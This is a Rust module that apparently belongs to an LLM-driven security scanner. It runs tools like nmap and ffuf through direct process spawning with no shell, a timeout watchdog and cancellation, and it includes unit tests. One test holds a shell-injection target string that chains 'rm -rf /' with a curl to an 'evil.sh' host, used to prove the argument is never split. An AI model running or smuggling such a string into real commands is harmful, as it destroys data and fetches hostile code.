//! Phase 4: execution. The executor is **how** a provider actually runs —
//! today a direct local process spawn, in the future optionally an HTTP
//! API, browser protocol, or MCP connection. Providers translate semantic
//! requests into their own invocation; executors run it.
//!
//! ```text
//! CapabilityRequest (semantic, validated)
//!   -> Provider (argument translation, trusted runtime code)
//!   -> Executor (this module: process spawn, NO shell)
//!   -> ProcessOutput (raw evidence)
//!   -> ToolResult (evidence + provenance)
//!   -> parsers (Phase 5)
//!   -> Observation
//! ```
//!
//! The LLM never touches the shell. Arguments come from
//! `ToolDefinition::default_args` plus whitelisted semantic option
//! bindings; the runtime supplies only the target.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

/// Raw evidence from one execution: stdout/stderr/exit code exactly as the
/// provider produced them, before any parsing. Parsers are lossy; evidence
/// is not. Preserved on [`ToolResult`] for debugging, auditability,
/// re-parsing, and evidence provenance.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ProcessOutput {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub timed_out: bool,
    pub error: Option<String>,
}

/// Result of executing a provider against a target. Carries the raw
/// evidence plus provenance (which provider, which capability, which
/// target) — everything an audit trail or a re-parse needs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToolResult {
    pub tool_id: String,
    pub capability: String,
    pub target: String,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub timed_out: bool,
    pub error: Option<String>,
}

impl ToolResult {
    /// Errors prefixed with this marker are deterministic rejections
    /// (target-kind guards, unsupported invocations) — re-running the
    /// exact same request can never succeed, so the runtime's retry
    /// loop must not re-attempt them.
    pub const NON_RETRYABLE_PREFIX: &'static str = "not retryable: ";

    pub fn success(&self) -> bool {
        self.exit_code == 0 && self.error.is_none() && !self.timed_out
    }

    /// True when this result's error is deterministic (see
    /// [`Self::NON_RETRYABLE_PREFIX`]).
    pub fn is_non_retryable(&self) -> bool {
        self.error
            .as_deref()
            .is_some_and(|e| e.starts_with(Self::NON_RETRYABLE_PREFIX))
    }

    pub fn combined_output(&self) -> String {
        if self.stdout.is_empty() && self.stderr.is_empty() {
            return String::new();
        }
        match (&self.stdout, &self.stderr) {
            (s, _) if !s.is_empty() => s.clone(),
            (_, s) => s.clone(),
        }
    }

    pub fn error(tool_id: &str, capability: &str, target: &str, msg: String) -> Self {
        Self {
            tool_id: tool_id.to_string(),
            capability: capability.to_string(),
            target: target.to_string(),
            exit_code: -1,
            stdout: String::new(),
            stderr: String::new(),
            timed_out: false,
            error: Some(msg),
        }
    }

    /// A deterministic failure: same request, same outcome. Used by
    /// target-kind guards so a URL aimed at a filesystem scanner fails
    /// instantly with actionable feedback instead of three retries.
    pub fn error_non_retryable(tool_id: &str, capability: &str, target: &str, msg: String) -> Self {
        Self::error(
            tool_id,
            capability,
            target,
            format!("{}{}", Self::NON_RETRYABLE_PREFIX, msg),
        )
    }
}

/// Execution abstraction: how a provider's invocation actually runs.
/// Implementations must never use a shell — the production executor
/// spawns the resolved executable directly with an argv list.
pub trait ProcessExecutor: Send + Sync {
    fn run(&self, exe: &str, args: &[String], timeout: Duration) -> ProcessOutput;
    /// Same as [`run`](Self::run) but feeds `stdin` to the child's
    /// standard input. The default ignores the bytes (test doubles);
    /// the production executor pipes them through a writer thread.
    fn run_with_stdin(
        &self,
        exe: &str,
        args: &[String],
        stdin: &[u8],
        timeout: Duration,
    ) -> ProcessOutput {
        let _ = stdin;
        self.run(exe, args, timeout)
    }
}

/// Production executor: direct process spawn via `std::process::Command`,
/// no shell, with a hard timeout enforced by a watchdog + child kill.
/// Optionally shares the session's cancel flag so a user Stop kills the
/// in-flight child immediately instead of waiting out the whole timeout.
#[derive(Debug, Clone)]
pub struct LocalProcessExecutor {
    timeout: Duration,
    /// Shared with the runtime's cancel handle. When it flips true, the
    /// running child is killed within one poll tick (~100ms) so the drive
    /// loop can honor a Stop promptly instead of blocking on a slow model
    /// or tool subprocess for minutes.
    cancel: Option<Arc<AtomicBool>>,
}

impl LocalProcessExecutor {
    /// Default watchdog: 5 minutes per invocation.
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(300),
            cancel: None,
        }
    }

    pub fn with_timeout(timeout: Duration) -> Self {
        Self { timeout, cancel: None }
    }

    /// Share a cancel flag (the runtime's handle) so Stop interrupts the
    /// in-flight subprocess.
    pub fn with_cancel(mut self, cancel: Arc<AtomicBool>) -> Self {
        self.cancel = Some(cancel);
        self
    }
}

impl Default for LocalProcessExecutor {
    fn default() -> Self {
        Self::new()
    }
}

impl ProcessExecutor for LocalProcessExecutor {
    fn run(&self, exe: &str, args: &[String], _timeout: Duration) -> ProcessOutput {
        spawn_with_timeout(exe, args, None, self.timeout, self.cancel.as_ref())
    }

    fn run_with_stdin(
        &self,
        exe: &str,
        args: &[String],
        stdin: &[u8],
        _timeout: Duration,
    ) -> ProcessOutput {
        spawn_with_timeout(exe, args, Some(stdin), self.timeout, self.cancel.as_ref())
    }
}

/// Test stub keyed by executable file name (e.g. "nmap" for
/// "/usr/bin/nmap"). Returns pre-configured output; unconfigured
/// executables yield an error result. Keeps the test suite offline and
/// deterministic while exercising the real provider/translation path.
pub struct StubExecutor {
    results: HashMap<String, ProcessOutput>,
}

impl StubExecutor {
    pub fn new() -> Self {
        Self {
            results: HashMap::new(),
        }
    }

    /// Configure a successful run for `exe_name` returning `stdout`.
    pub fn success(exe_name: &str, stdout: &str) -> Self {
        Self::new().with_output(
            exe_name,
            ProcessOutput {
                exit_code: 0,
                stdout: stdout.to_string(),
                stderr: String::new(),
                timed_out: false,
                error: None,
            },
        )
    }

    pub fn with_output(mut self, exe_name: &str, output: ProcessOutput) -> Self {
        self.results.insert(exe_name.to_string(), output);
        self
    }
}

impl Default for StubExecutor {
    fn default() -> Self {
        Self::new()
    }
}

impl ProcessExecutor for StubExecutor {
    fn run(&self, exe: &str, _args: &[String], _timeout: Duration) -> ProcessOutput {
        let name = std::path::Path::new(exe)
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_default();
        self.results
            .get(&name)
            .cloned()
            .unwrap_or_else(|| ProcessOutput {
                exit_code: -1,
                stdout: String::new(),
                stderr: String::new(),
                timed_out: false,
                error: Some(format!("stub: no result configured for '{exe}'")),
            })
    }
}

/// Test double that records every invocation (exe + argv) and returns a
/// fixed output. Used to prove command-safety properties: what argv the
/// provider actually constructed.
#[cfg(test)]
pub(crate) struct RecordingExecutor {
    pub calls: std::sync::Mutex<Vec<(String, Vec<String>)>>,
    pub output: ProcessOutput,
}

#[cfg(test)]
impl RecordingExecutor {
    pub fn succeeding() -> Self {
        Self {
            calls: std::sync::Mutex::new(Vec::new()),
            output: ProcessOutput {
                exit_code: 0,
                stdout: String::new(),
                stderr: String::new(),
                timed_out: false,
                error: None,
            },
        }
    }
}

#[cfg(test)]
impl ProcessExecutor for RecordingExecutor {
    fn run(&self, exe: &str, args: &[String], _timeout: Duration) -> ProcessOutput {
        self.calls
            .lock()
            .unwrap()
            .push((exe.to_string(), args.to_vec()));
        self.output.clone()
    }
}

/// Replace `{target}` placeholders in arg templates — both bare args
/// (`"{target}"`) and embedded ones (`"dir:{target}"`). `{script:name}`
/// placeholders expand to the absolute path of an embedded sidecar
/// script (see `infra::scripts`), written into the state dir on first
/// use. Also resolves `wordlists/...` relative to the medusa binary's
/// repo root so ffuf's `wordlists/common.txt` works both in `cargo run`
/// and installed binary.
pub fn resolve_args(template: &[String], target: &str) -> Vec<String> {
    template
        .iter()
        .map(|a| {
            let mut arg = a.replace("{target}", target);
            if let Some(rest) = arg.strip_prefix("{script:") {
                if let Some(name) = rest.strip_suffix('}') {
                    if let Some(path) = crate::infra::scripts::ensure_script(name) {
                        return path.to_string_lossy().into_owned();
                    }
                }
            }
            if arg.starts_with("wordlists/") {
                // Resolve relative to repo root (next to Cargo.toml) when running
                // from source, otherwise keep as-is for installed binary where
                // wordlists are bundled.
                let candidate = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(&arg);
                if candidate.exists() {
                    arg = candidate.to_string_lossy().to_string();
                }
            }
            arg
        })
        .collect()
}

/// Parse an npm-generated `.cmd` shim into the invocation it wraps:
/// `(program, prefix_args)`. npm installs global CLIs (opencode,
/// claude, …) as `name.cmd` shims with no `name.exe` anywhere on PATH,
/// so `Command::new("name")` fails with "program not found" on
/// Windows. Modern shims come in two shapes:
///
/// ```text
/// "%dp0%\node_modules\pkg\bin\tool.exe"  %*
/// "%_prog%"  "%dp0%\node_modules\pkg\bin\cli.js"  %*
/// ```
///
/// `%dp0%` is the shim's own directory, `%_prog%` is `node`. Resolving
/// through to the underlying binary (or `node script.js`) preserves
/// the no-shell guarantee: arguments stay argv elements, nothing is
/// re-parsed by `cmd.exe`. Unrecognized content yields `None` so the
/// caller falls back to spawning the original name unchanged.
#[cfg_attr(not(windows), allow(dead_code))]
fn parse_npm_cmd_shim(
    content: &str,
    shim_dir: &std::path::Path,
) -> Option<(String, Vec<String>)> {
    // The invocation is the last line forwarding arguments (`%*`).
    let invocation = content.lines().rev().find(|l| l.contains("%*"))?;
    let dir = shim_dir.to_string_lossy().into_owned();
    let expand = |s: &str| s.replace("%~dp0", &dir).replace("%dp0%", &dir);
    let is_script = |s: &str| {
        let lower = s.to_lowercase();
        lower.ends_with(".js") || lower.ends_with(".mjs") || lower.ends_with(".cjs")
    };

    // Quoted segments of the invocation line.
    let mut quoted: Vec<String> = Vec::new();
    let mut rest = invocation;
    while let Some(start) = rest.find('"') {
        let Some(end_rel) = rest[start + 1..].find('"') else {
            break;
        };
        let end = start + 1 + end_rel;
        quoted.push(rest[start + 1..end].to_string());
        rest = &rest[end + 1..];
    }

    let first = quoted.first()?;
    if first.contains("%_prog%") {
        // `"%_prog%" "…\cli.js" %*` — node running a script.
        let script = expand(quoted.get(1)?);
        if is_script(&script) {
            return Some(("node".to_string(), vec![script]));
        }
        return None;
    }
    let target = expand(first);
    if target.to_lowercase().ends_with(".exe") {
        return Some((target, Vec::new()));
    }
    if is_script(&target) {
        // `node "…\cli.js" %*` — node written literally before the script.
        return Some(("node".to_string(), vec![target]));
    }
    None
}

/// Windows-only shim resolution: when `exe` is a bare name whose only
/// presence on PATH is an npm `.cmd` shim, translate it into the real
/// invocation (see [`parse_npm_cmd_shim`]). Everything else — paths,
/// extension-carrying names, missing or unparsable shims — passes
/// through unchanged so normal spawns and their errors are unaffected.
#[cfg(windows)]
fn resolve_windows_shim(exe: &str, args: &[String]) -> (String, Vec<String>) {
    if exe.contains('\\') || exe.contains('/') || exe.contains('.') {
        return (exe.to_string(), args.to_vec());
    }
    if let Some(path) = std::env::var_os("PATH") {
        for dir in std::env::split_paths(&path) {
            let shim = dir.join(format!("{exe}.cmd"));
            if shim.is_file() {
                if let Ok(content) = std::fs::read_to_string(&shim) {
                    if let Some((program, prefix)) = parse_npm_cmd_shim(&content, &dir) {
                        let mut argv = prefix;
                        argv.extend(args.iter().cloned());
                        return (program, argv);
                    }
                }
            }
        }
    }
    (exe.to_string(), args.to_vec())
}

/// How often the watchdog checks the child's exit status, the cancel
/// flag, and the deadline. Small enough that Stop feels instant, large
/// enough not to busy-spin.
const POLL_INTERVAL: Duration = Duration::from_millis(100);

/// Spawn a process with a timeout and optional cancellation. **No shell is
/// ever used**: the executable path is invoked directly with an argv list,
/// so a malicious target string can only ever become a single argv
/// element, never a command. On Windows, npm `.cmd` shims are first
/// resolved through to the real executable — still a direct spawn, never
/// `cmd.exe`.
///
/// Unlike a plain blocking wait, the parent OWNS the child and polls it,
/// so it can **kill** it the moment `cancel` flips (a user Stop) or the
/// deadline passes — the previous version blocked on the child and could
/// not honor a Stop until the subprocess finished on its own, which for a
/// slow model/tool call meant minutes of a frozen, unusable session.
pub(crate) fn spawn_with_timeout(
    exe: &str,
    args: &[String],
    stdin: Option<&[u8]>,
    timeout: Duration,
    cancel: Option<&Arc<AtomicBool>>,
) -> ProcessOutput {
    #[cfg(windows)]
    let (program, argv) = resolve_windows_shim(exe, args);
    #[cfg(not(windows))]
    let (program, argv) = (exe.to_string(), args.to_vec());

    let mut cmd = Command::new(&program);
    cmd.args(&argv);
    cmd.stdout(std::process::Stdio::piped());
    cmd.stderr(std::process::Stdio::piped());
    if stdin.is_some() {
        cmd.stdin(std::process::Stdio::piped());
    } else {
        // Null, exactly as `Command::output` behaved: tools must never
        // block waiting on a console GUI launches don't have.
        cmd.stdin(std::process::Stdio::null());
    }

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            return ProcessOutput {
                exit_code: -1,
                stdout: String::new(),
                stderr: String::new(),
                timed_out: false,
                error: Some(format!("failed to execute {exe}: {e}")),
            };
        }
    };

    // Feed stdin on its own thread: prompts can exceed the OS pipe buffer,
    // so the write must not block the watchdog below.
    if let Some(data) = stdin.map(|s| s.to_vec()) {
        if let Some(mut handle) = child.stdin.take() {
            thread::spawn(move || {
                let _ = handle.write_all(&data);
            });
        }
    }

    // Drain stdout/stderr on their own threads so a child that fills a
    // pipe never deadlocks while we poll for exit.
    let drain = |pipe: Option<std::process::ChildStdout>| {
        thread::spawn(move || {
            let mut buf = Vec::new();
            if let Some(mut p) = pipe {
                let _ = p.read_to_end(&mut buf);
            }
            buf
        })
    };
    let out_t = drain(child.stdout.take());
    let err_pipe = child.stderr.take();
    let err_t = thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(mut p) = err_pipe {
            let _ = p.read_to_end(&mut buf);
        }
        buf
    });

    // Watchdog: poll exit, cancel, deadline. Kill the child on cancel or
    // timeout so this returns promptly instead of blocking on a slow or
    // hung subprocess.
    let start = Instant::now();
    let mut cancelled = false;
    let mut timed_out = false;
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break Some(st),
            Ok(None) => {}
            Err(_) => break None,
        }
        if cancel.map_or(false, |c| c.load(Ordering::SeqCst)) {
            cancelled = true;
            let _ = child.kill();
            let _ = child.wait();
            break None;
        }
        if start.elapsed() >= timeout {
            timed_out = true;
            let _ = child.kill();
            let _ = child.wait();
            break None;
        }
        thread::sleep(POLL_INTERVAL);
    };

    let stdout = String::from_utf8_lossy(&out_t.join().unwrap_or_default()).into_owned();
    let stderr = String::from_utf8_lossy(&err_t.join().unwrap_or_default()).into_owned();

    if cancelled {
        return ProcessOutput {
            exit_code: -1,
            stdout,
            stderr,
            timed_out: false,
            error: Some("tool execution cancelled".to_string()),
        };
    }
    if timed_out {
        return ProcessOutput {
            exit_code: -1,
            stdout,
            stderr,
            timed_out: true,
            error: Some(format!("tool execution timed out after {timeout:?}")),
        };
    }
    ProcessOutput {
        exit_code: status.and_then(|s| s.code()).unwrap_or(-1),
        stdout,
        stderr,
        timed_out: false,
        error: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cancel_flag_returns_promptly_and_kills_child() {
        // A long-running child with a long timeout, but the cancel flag is
        // already set: the watchdog must kill it on the first poll and
        // return in well under the timeout — the whole point of making
        // Stop interrupt an in-flight subprocess.
        let cancel = Arc::new(AtomicBool::new(true));
        #[cfg(windows)]
        let (exe, args) = (
            "ping".to_string(),
            vec!["-n".to_string(), "30".to_string(), "127.0.0.1".to_string()],
        );
        #[cfg(not(windows))]
        let (exe, args) = ("sleep".to_string(), vec!["30".to_string()]);

        let start = Instant::now();
        let out = spawn_with_timeout(&exe, &args, None, Duration::from_secs(30), Some(&cancel));
        let elapsed = start.elapsed();
        assert!(
            elapsed < Duration::from_secs(5),
            "a cancelled spawn must return promptly, took {elapsed:?}"
        );
        // Either the child was killed (cancelled) or it never spawned —
        // both return an error rather than blocking the full 30s.
        assert!(out.error.is_some(), "cancelled/failed spawn reports an error");
    }

    #[test]
    fn resolve_args_substitutes_target() {
        let template = vec!["-sV".to_string(), "{target}".to_string()];
        let resolved = resolve_args(&template, "10.0.0.1");
        assert_eq!(resolved, vec!["-sV".to_string(), "10.0.0.1".to_string()]);
    }

    #[test]
    fn resolve_args_no_placeholder() {
        let template = vec!["--version".to_string()];
        let resolved = resolve_args(&template, "10.0.0.1");
        assert_eq!(resolved, vec!["--version".to_string()]);
    }

    #[test]
    fn resolve_args_substitutes_embedded_target() {
        // Schemes like grype's `dir:{target}` substitute in place, still as a
        // single argv element.
        let template = vec![
            "dir:{target}".to_string(),
            "-o".to_string(),
            "json".to_string(),
        ];
        let resolved = resolve_args(&template, "C:\\scan");
        assert_eq!(
            resolved,
            vec![
                "dir:C:\\scan".to_string(),
                "-o".to_string(),
                "json".to_string()
            ]
        );
    }

    #[test]
    fn resolve_args_empty() {
        let resolved = resolve_args(&[], "10.0.0.1");
        assert!(resolved.is_empty());
    }

    #[test]
    fn resolve_args_unknown_script_placeholder_is_kept_verbatim() {
        // Unknown sidecar names cannot be resolved to a script path — the
        // placeholder stays so the invocation fails loudly at the process
        // boundary instead of silently scanning something else.
        let template = vec!["{script:no-such.mjs}".to_string(), "--url".to_string()];
        let resolved = resolve_args(&template, "http://example.com");
        assert_eq!(
            resolved,
            vec!["{script:no-such.mjs}".to_string(), "--url".to_string()]
        );
    }

    #[test]
    fn resolve_args_known_script_expands_to_state_dir_path() {
        let template = vec!["{script:browser-observe.mjs}".to_string()];
        let resolved = resolve_args(&template, "http://example.com");
        assert_eq!(resolved.len(), 1);
        let p = resolved[0].replace('\\', "/");
        assert!(
            p.ends_with("/scripts/browser-observe.mjs")
                || p.ends_with("\\scripts\\browser-observe.mjs"),
            "expanded to {p}"
        );
        assert!(
            std::path::Path::new(&resolved[0]).is_file(),
            "script written"
        );
    }

    #[test]
    fn resolve_args_keeps_hostile_target_as_single_argv_element() {
        // A target containing shell metacharacters must never be split or
        // interpreted — it stays one argv element (no shell is involved).
        let template = vec!["-u".to_string(), "{target}".to_string()];
        let hostile = "example.com; rm -rf / && curl evil.sh";
        let resolved = resolve_args(&template, hostile);
        assert_eq!(resolved.len(), 2);
        assert_eq!(resolved[1], hostile);
    }

    #[test]
    fn tool_result_success() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: 0,
            stdout: "open".into(),
            stderr: String::new(),
            timed_out: false,
            error: None,
        };
        assert!(r.success());
    }

    #[test]
    fn tool_result_nonzero_exit_is_not_success() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: 1,
            stdout: String::new(),
            stderr: "error".into(),
            timed_out: false,
            error: None,
        };
        assert!(!r.success());
    }

    #[test]
    fn tool_result_error_is_not_success() {
        let r = ToolResult::error("nmap", "network.port_scan", "10.0.0.1", "not found".into());
        assert!(!r.success());
        assert_eq!(r.error.as_deref(), Some("not found"));
    }

    #[test]
    fn tool_result_timed_out_is_not_success() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: -1,
            stdout: String::new(),
            stderr: String::new(),
            timed_out: true,
            error: Some("timed out".into()),
        };
        assert!(!r.success());
    }

    #[test]
    fn tool_result_combined_output_prefers_stdout() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: 0,
            stdout: "some output".into(),
            stderr: "some error".into(),
            timed_out: false,
            error: None,
        };
        assert_eq!(r.combined_output(), "some output");
    }

    #[test]
    fn stub_executor_matches_by_executable_file_name() {
        let stub = StubExecutor::success("nmap", "port 22 open");
        let out = stub.run("/usr/bin/nmap", &[], Duration::from_secs(5));
        assert_eq!(out.exit_code, 0);
        assert_eq!(out.stdout, "port 22 open");
    }

    #[test]
    fn stub_executor_returns_error_for_unconfigured() {
        let stub = StubExecutor::new();
        let out = stub.run("/bin/nmap", &[], Duration::from_secs(5));
        assert!(out.error.is_some());
    }

    #[test]
    fn local_executor_runs_a_real_process_without_shell() {
        // `cmd /c echo` on Windows, `echo` elsewhere — both prove the
        // direct-spawn path executes and captures output.
        #[cfg(target_os = "windows")]
        let (exe, args): (&str, Vec<String>) = ("cmd", vec!["/C".into(), "echo medusa-ok".into()]);
        #[cfg(not(target_os = "windows"))]
        let (exe, args): (&str, Vec<String>) = ("echo", vec!["medusa-ok".into()]);

        let out = LocalProcessExecutor::with_timeout(Duration::from_secs(10)).run(
            exe,
            &args,
            Duration::from_secs(10),
        );
        assert!(out.error.is_none(), "spawn failed: {:?}", out.error);
        assert_eq!(out.exit_code, 0);
        assert!(
            out.stdout.trim().contains("medusa-ok") || out.stderr.trim().contains("medusa-ok"),
            "stdout={:?} stderr={:?}",
            out.stdout,
            out.stderr
        );
    }

    #[test]
    fn npm_shim_native_binary_resolves_to_direct_exe() {
        // Shape of the shim npm generates for packages shipping a
        // native binary (e.g. opencode-ai).
        let content = r#"@ECHO off
GOTO start
:find_dp0
SET dp0=%~dp0
EXIT /b
:start
SETLOCAL
CALL :find_dp0
"%dp0%\node_modules\opencode-ai\bin\opencode.exe"   %*
"#;
        let (program, prefix) =
            parse_npm_cmd_shim(content, std::path::Path::new(r"C:\npm")).unwrap();
        assert_eq!(program, r"C:\npm\node_modules\opencode-ai\bin\opencode.exe");
        assert!(prefix.is_empty());
    }

    #[test]
    fn npm_shim_node_prog_runs_script_with_node() {
        // Shape npm generates for node-script packages: `%_prog%` is
        // node, the second quoted segment is the script.
        let content = r#"@ECHO off
SETLOCAL
"%_prog%"  "%dp0%\node_modules\@scope\pkg\bin\cli.js" %*
"#;
        let (program, prefix) =
            parse_npm_cmd_shim(content, std::path::Path::new(r"C:\npm")).unwrap();
        assert_eq!(program, "node");
        assert_eq!(
            prefix,
            vec![r"C:\npm\node_modules\@scope\pkg\bin\cli.js".to_string()]
        );
    }

    #[test]
    fn npm_shim_literal_node_invocation_prefixes_script() {
        // Older shims write `node` literally before the script path.
        let content = r#"node "%dp0%\node_modules\pkg\bin\run.js" %*
"#;
        let (program, prefix) =
            parse_npm_cmd_shim(content, std::path::Path::new(r"C:\npm")).unwrap();
        assert_eq!(program, "node");
        assert_eq!(prefix, vec![r"C:\npm\node_modules\pkg\bin\run.js".to_string()]);
    }

    #[test]
    fn npm_shim_unrecognized_content_is_rejected() {
        let base = std::path::Path::new(r"C:\npm");
        assert!(parse_npm_cmd_shim("@ECHO off\nEXIT /b\n", base).is_none());
        assert!(parse_npm_cmd_shim("echo hi\n", base).is_none());
        assert!(parse_npm_cmd_shim("", base).is_none());
        // A `%*` line whose quoted target is neither an exe nor a script.
        assert!(parse_npm_cmd_shim(r#""%dp0%\weird.bin" %*"#, base).is_none());
        // node-style shim missing its script segment.
        assert!(parse_npm_cmd_shim(r#""%_prog%" %*"#, base).is_none());
        // node-style shim whose second segment is not a script.
        assert!(parse_npm_cmd_shim(r#""%_prog%" "%dp0%\data.txt" %*"#, base).is_none());
    }

    #[test]
    #[ignore = "live: needs an npm-installed CLI (e.g. opencode) on PATH"]
    fn npm_shim_resolves_cli_from_path_end_to_end() {
        // `opencode` exists only as an npm .cmd shim on PATH — the exact
        // case that used to fail with "program not found". Direct spawn
        // of the resolved binary must now work and capture output.
        let out = spawn_with_timeout(
            "opencode",
            &["--version".to_string()],
            None,
            Duration::from_secs(60),
            None,
        );
        assert!(out.error.is_none(), "spawn failed: {:?}", out.error);
        assert_eq!(out.exit_code, 0);
        assert!(!out.stdout.trim().is_empty(), "no version output");
    }

    #[test]
    fn local_executor_delivers_stdin_to_child() {
        // `sort` (Windows) / `cat` (Unix) echo piped stdin to stdout —
        // proves the writer thread feeds the child without deadlocking.
        #[cfg(target_os = "windows")]
        let (exe, args): (&str, Vec<String>) = ("sort", Vec::new());
        #[cfg(not(target_os = "windows"))]
        let (exe, args): (&str, Vec<String>) = ("cat", Vec::new());

        let out = spawn_with_timeout(exe, &args, Some(b"stdin-ok\n"), Duration::from_secs(15), None);
        assert!(out.error.is_none(), "spawn failed: {:?}", out.error);
        assert_eq!(out.exit_code, 0);
        assert!(out.stdout.contains("stdin-ok"), "stdout={:?}", out.stdout);
    }
}
